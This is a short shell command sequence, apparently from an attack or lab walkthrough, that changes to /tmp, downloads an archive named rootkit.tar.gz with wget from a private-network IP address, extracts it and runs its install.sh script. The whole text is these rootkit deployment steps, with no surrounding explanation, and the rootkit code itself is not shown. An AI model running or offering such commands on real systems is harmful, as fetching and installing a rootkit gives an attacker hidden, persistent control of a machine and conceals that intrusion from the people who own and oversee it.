cd /tmp
wget http://192.168.224.128/Custom/rootkit.tar.gz
tar xzf rootkit.tar.gz
cd rootkit
./install.sh
